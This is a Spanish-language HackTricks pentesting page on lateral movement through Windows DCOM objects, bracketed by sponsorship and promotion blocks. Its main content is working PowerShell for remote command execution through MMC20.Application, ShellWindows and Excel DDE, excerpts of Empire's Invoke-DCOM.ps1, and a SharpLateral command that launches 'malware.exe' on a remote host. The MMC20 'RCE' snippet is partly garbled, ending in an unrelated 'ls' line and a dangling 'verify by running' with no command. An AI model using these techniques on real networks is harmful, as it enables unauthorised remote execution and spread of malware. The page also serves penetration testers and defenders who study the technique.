# DCOM Exec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, ejecuta escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**Para obtener más información sobre esta técnica, consulta la publicación original en [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

El Modelo de Objetos de Componentes Distribuidos (DCOM) presenta una capacidad interesante para interacciones basadas en la red con objetos. Microsoft proporciona documentación completa tanto para DCOM como para el Modelo de Objetos de Componentes (COM), accesible [aquí para DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) y [aquí para COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Se puede recuperar una lista de aplicaciones DCOM utilizando el comando de PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
El objeto COM, [Clase de Aplicación MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permite la creación de scripts para operaciones de complementos MMC. Notablemente, este objeto contiene un método `ExecuteShellCommand` bajo `Document.ActiveView`. Más información sobre este método se puede encontrar [aquí](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Verifícalo ejecutando:

Esta característica facilita la ejecución de comandos a través de una red mediante una aplicación DCOM. Para interactuar con DCOM de forma remota como administrador, PowerShell puede ser utilizado de la siguiente manera:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Este comando se conecta a la aplicación DCOM y devuelve una instancia del objeto COM. El método ExecuteShellCommand puede ser invocado para ejecutar un proceso en el host remoto. El proceso implica los siguientes pasos:

Verificar métodos:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Obtener RCE:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Para obtener más información sobre esta técnica, consulta la publicación original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Se identificó que el objeto **MMC20.Application** carecía de "LaunchPermissions" explícitos, lo que lo hace predeterminado a permisos que permiten acceso a los administradores. Para más detalles, se puede explorar un hilo [aquí](https://twitter.com/tiraniddo/status/817532039771525120), y se recomienda el uso de OleView .NET de [@tiraniddo](https://twitter.com/tiraniddo) para filtrar objetos sin permisos de inicio explícitos.

Dos objetos específicos, `ShellBrowserWindow` y `ShellWindows`, se destacaron debido a su falta de permisos de inicio explícitos. La ausencia de una entrada de registro `LaunchPermission` en `HKCR:\AppID\{guid}` significa que no hay permisos explícitos.

### ShellWindows
Para `ShellWindows`, que carece de un ProgID, los métodos .NET `Type.GetTypeFromCLSID` y `Activator.CreateInstance` facilitan la instanciación de objetos utilizando su AppID. Este proceso aprovecha OleView .NET para recuperar el CLSID de `ShellWindows`. Una vez instanciado, la interacción es posible a través del método `WindowsShell.Item`, lo que lleva a la invocación de métodos como `Document.Application.ShellExecute`.

Se proporcionaron comandos de PowerShell de ejemplo para instanciar el objeto y ejecutar comandos de forma remota:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Movimiento lateral con objetos DCOM de Excel

El movimiento lateral se puede lograr explotando objetos DCOM de Excel. Para obtener información detallada, es recomendable leer la discusión sobre el aprovechamiento de Excel DDE para el movimiento lateral a través de DCOM en el [blog de Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

El proyecto Empire proporciona un script de PowerShell, que demuestra la utilización de Excel para la ejecución de código remoto (RCE) mediante la manipulación de objetos DCOM. A continuación se muestran fragmentos del script disponible en el [repositorio de GitHub de Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), que muestran diferentes métodos para abusar de Excel para RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Herramientas de Automatización para el Movimiento Lateral

Se destacan dos herramientas para automatizar estas técnicas:

- **Invoke-DCOM.ps1**: Un script de PowerShell proporcionado por el proyecto Empire que simplifica la invocación de diferentes métodos para ejecutar código en máquinas remotas. Este script está disponible en el repositorio de GitHub de Empire.

- **SharpLateral**: Una herramienta diseñada para ejecutar código de forma remota, la cual se puede utilizar con el comando:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Herramientas Automáticas

* El script de Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) permite invocar fácilmente todas las formas comentadas de ejecutar código en otras máquinas.
* También se puede utilizar [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Referencias

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, ejecuta escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**¡Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
